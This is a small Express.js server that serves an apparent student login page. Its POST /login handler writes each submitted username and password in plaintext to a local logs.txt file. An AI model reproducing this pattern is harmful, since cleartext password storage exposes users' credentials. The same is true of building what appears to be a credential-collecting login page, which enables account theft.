const express = require("express");
const fs = require("fs")
const path = require("path")
const app = express();
let port = 3000;

const staticPath = path.join(__dirname, './public');

app.use(express.static(staticPath))
var cons = require('consolidate');

// view engine setup

app.engine('html', cons.swig)
app.set('views', path.join(__dirname, './public'));
app.set('view engine', 'html');
app.use(express.urlencoded())

app.get('/', (req, res) => {
    res.status(200).render('loginpage.html')
});

let date = new Date();

app.post("/login", (req, res) => {

    name = req.body.username;
    pass = req.body.pass;
    let outputToWrite = `\n{\n Student : ${name} \n @ ${date} \n Password: ${pass}\n}`;
    fs.appendFileSync('logs.txt', outputToWrite);

    const params = { 'message': "Your form has been submitted successfully" };
    res.render('studentpage.html')

    // res.status(200).render('index.pug', params);
})

app.get('/studentpage', (req, res) => {
    res.sendFile(path.resolve('./public/studentpage.html'));
})

app.get('/contactus', (req, res) => {
    res.sendFile(path.resolve('./public/contactus.html'));
})

app.listen(port, () => {
    console.log("Listening at port :", port)
})